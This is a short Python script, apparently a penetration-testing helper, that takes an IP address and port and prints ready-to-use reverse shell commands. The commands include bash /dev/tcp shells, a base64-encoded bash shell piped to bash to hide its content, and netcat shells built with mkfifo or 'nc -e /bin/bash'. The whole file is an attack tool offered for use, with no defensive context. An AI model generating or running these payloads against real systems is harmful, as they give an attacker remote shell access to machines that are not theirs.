#!/usr/bin/python3
# Importing Libraries
import sys
import base64
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
try:
    #Checking For Given Arguments 
    ip=sys.argv[1]
    port=sys.argv[2]
    #Generating Shellz
    print("Generating Payloads For ",ip," Port",port)
    print(f"{bcolors.OKBLUE}╠══════════════════════════════════════════»{bcolors.OKGREEN}BASH{bcolors.OKBLUE}«══════════════════════════════════════════╣")
    print(f"{bcolors.WARNING}❯{bcolors.OKCYAN} bash -c 'exec bash -i &>/dev/tcp/{ip}/{port} <&1'")
    print(f"{bcolors.WARNING}❯{bcolors.OKCYAN} bash -i >& /dev/tcp/{ip}/{port} 0>&1")
    b64o = base64.b64encode((f"bash -c 'exec bash -i &>/dev/tcp/{ip}/{port} <&1'").encode("ascii")).decode("utf-8")
    print(f"{bcolors.WARNING}❯{bcolors.OKCYAN} echo '{b64o}'|base64 -d|bash")
    print(f"{bcolors.OKBLUE}╠═══════════════════════════════════════════»{bcolors.OKGREEN}NC{bcolors.OKBLUE}«═══════════════════════════════════════════╣")
    print(f"{bcolors.WARNING}❯{bcolors.OKCYAN} rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")
    print(f"{bcolors.WARNING}❯{bcolors.OKCYAN} nc {ip} {port} -e /bin/bash")
except:
    usage=f"""{bcolors.OKBLUE}
╔═══════════════════════════════════════════════════════════════════╗
║{bcolors.WARNING} # {sys.argv[0]} [IP] [PORT]                                           {bcolors.OKBLUE}║
║{bcolors.WARNING} For Eg:- {sys.argv[0]} 10.10.14.2 1337                                {bcolors.OKBLUE}║
╚═══════════════════════════════════════════════════════════════════╝
   """
    print(usage)
